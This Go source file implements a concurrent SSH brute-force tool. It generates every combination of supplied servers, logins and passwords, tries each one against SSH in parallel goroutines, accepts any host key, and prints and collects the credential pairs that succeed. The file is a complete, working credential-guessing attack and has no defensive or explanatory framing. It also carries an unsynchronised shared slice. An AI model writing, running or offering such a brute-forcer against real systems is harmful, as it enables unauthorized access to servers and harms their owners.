package types

import (
	. "fmt"
	"golang.org/x/crypto/ssh"
	"net"
	"sync"
)

type UserData struct {
	Server, Login, Password string
}

type Brute struct {
	Uds   []UserData
	tasks chan UserData
}

func NewBrute(servers, logins, passwords []string) Brute {
	b := Brute{}

	for _, server := range servers {
		for _, login := range logins {
			for _, password := range passwords {
				b.Uds = append(b.Uds, UserData{server, login, password})
			}
		}
	}

	return b
}

func (b *Brute) fill(data []UserData) {
	(*b).tasks = make(chan UserData, 1e6)
	for _, d := range data {
		(*b).tasks <- d
	}
	close(b.tasks)
}

func (b Brute) Run(count int) []UserData {
	var wg sync.WaitGroup
	var res []UserData

	b.fill(b.Uds)

	wg.Add(count)
	for i := 0; i < count; i++ {
		go func(b Brute) {
			defer wg.Done()
			for data := range b.tasks {
				// TODO: WRITE HERE CHECK FOR SSH LOGIN/PASSWORD

				sshConfig := &ssh.ClientConfig{
					User: data.Login,
					Auth: []ssh.AuthMethod{
						ssh.Password(data.Password),
					},
					HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
						return nil
					},
				}

				client, err := ssh.Dial("tcp", data.Server, sshConfig)
				if err != nil {
					// Println(err)
					Println("NONE", data)
				} else {
					defer client.Close()
					res = append(res, data)
					Println("YES", data)
				}
			}
		}(b)
	}

	wg.Wait()
	return res
}
